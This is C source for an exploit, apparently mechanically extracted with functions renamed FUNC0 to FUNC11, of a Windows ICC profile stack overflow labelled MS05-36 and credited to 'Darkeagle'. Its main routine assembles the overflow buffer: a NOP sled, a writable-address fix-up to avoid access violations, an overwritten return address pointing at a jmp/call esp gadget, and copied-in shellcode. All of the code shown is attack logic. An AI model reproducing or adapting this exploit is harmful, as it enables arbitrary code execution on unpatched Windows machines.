#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {unsigned int writeable_add; unsigned int jmpADD; } ;
typedef  int /*<<< orphan*/  DWORD ;

/* Variables and functions */
 int TARGET ; 
 int FUNC0 (char*) ; 
 int buff ; 
 int /*<<< orphan*/  FUNC1 () ; 
 int content_size_offset ; 
 int /*<<< orphan*/  FUNC2 (int,unsigned int) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC4 () ; 
 int /*<<< orphan*/  FUNC5 (int,int,unsigned int) ; 
 int no_access_violate ; 
 int no_access_violate2 ; 
 int /*<<< orphan*/  FUNC6 (char*,...) ; 
 int ret_addr_offset ; 
 int /*<<< orphan*/  shellcode ; 
 int /*<<< orphan*/  FUNC7 (char*,char*,long*) ; 
 int stack_land_offset ; 
 unsigned int FUNC8 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC9 (int,int /*<<< orphan*/ ,unsigned int) ; 
 int /*<<< orphan*/  FUNC10 (unsigned int) ; 
 int tag_content_offset ; 
 TYPE_1__* targets ; 

int FUNC11(int argc, char *argv[])
{
int i=0, t=TARGET, size=0;
int shal = 0;
unsigned int sc_size = FUNC8(shellcode);
unsigned int tag_size = stack_land_offset - tag_content_offset + 1 + sc_size ;
long fRetaddr = 0x00;

if (argc < 2) {
FUNC6("\n\n");

FUNC6("* Windows ICC stack overflow exploit (MS05-36)\n");
FUNC6("* Code Execution Exploit\n");
FUNC6("* (c) Darkeagle [ private code ]\n");
FUNC6("* usage -> ms05-036 <target> (jmp/call esp)\n");
FUNC4() ;
FUNC3(0);
}

t=FUNC0(argv[1]);

if ( argc == 3 )
FUNC7(argv[2], "0x%x", &fRetaddr);

FUNC5(buff + tag_content_offset, 0x90,tag_size);

*(DWORD*)(buff + no_access_violate2) = FUNC10(targets[t-1].writeable_add);
*(DWORD*)(buff + no_access_violate)  = FUNC10(0x4);
if ( fRetaddr == 0x00 )
{
*(DWORD*)(buff + ret_addr_offset)    = FUNC10(targets[t-1].jmpADD);
} else {
*(DWORD*)(buff + ret_addr_offset)    = FUNC10(fRetaddr);
}
FUNC9(buff + stack_land_offset, shellcode, sc_size);
FUNC2(buff + stack_land_offset, sc_size);

tag_size = (tag_size >> 2 << 2) + 4;
FUNC6("current size: 0x%.8X\n",tag_size);
*(DWORD*)(buff + content_size_offset) = FUNC10(tag_size);

FUNC1();

return 0;

}